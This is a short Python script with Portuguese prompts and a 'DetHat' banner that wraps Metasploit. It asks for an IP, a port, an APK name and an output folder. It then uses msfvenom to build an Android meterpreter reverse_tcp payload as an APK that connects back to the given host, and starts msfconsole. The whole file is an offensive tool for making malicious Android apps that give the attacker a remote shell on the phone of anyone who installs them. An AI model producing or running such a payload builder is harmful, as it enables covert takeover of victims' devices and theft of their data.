import os 
# variaveis
verde = "\033[0;32m"
azul = "\033[0;34m"
purple = "\033[0;35m"
cyan ="\033[0;36m"
vermelhoClaro = "\033[1;31m"
azulClaro = "\033[1;34m"
purpleClaro = "\033[1;35m"
preto = "\033[0;30m" 
os.system("clear") 
print(purple + "      ____       _   _   _       _")
print(purple + "     |  _ \  ___| |_| | | | __ _| |_")
print(purple + "     | | | |/ _ \ __| |_| |/ _` | __|")
print(purple + "     | |_| |  __/ |_|  _  | (_| | |_")
print(purple + "     |____/ \___|\__|_| |_|\__,_|\__|")
print("") 
#print(cyan + "coded by: detsec") 
print("")
print("")
ip = input(vermelhoClaro + "     Informe o ip: " + preto)
print("")
print(vermelhoClaro + "     [+] IP INFORMADO: {} [+]".format(ip))
print("")
os.system("sleep 2")
print("")
porta = input(vermelhoClaro + "     Informe a porta: " + preto)
print("")
print(vermelhoClaro + "     [+] PORTA INFORMADA: {} [+]".format(porta))
print("")
os.system("sleep 2")
print("")
nome = input(vermelhoClaro + "     Informe o nome: " + preto)
print("")
print(vermelhoClaro + "     [+] NOME DO APK: {}.apk [+]".format(nome))
print("")
os.system("sleep 2")
print("")
local = input(azulClaro + "     Informe o endereço de destino: " + preto) 
os.system("clear") 
os.system(f"msfvenom -p android/meterpreter/reverse_tcp lhost={ip} lport={porta} R > {local}/{nome}.apk")
os.system("clear") 
print(purpleClaro + "         Iniciando metasploit..." + preto) 
os.system("msfconsole")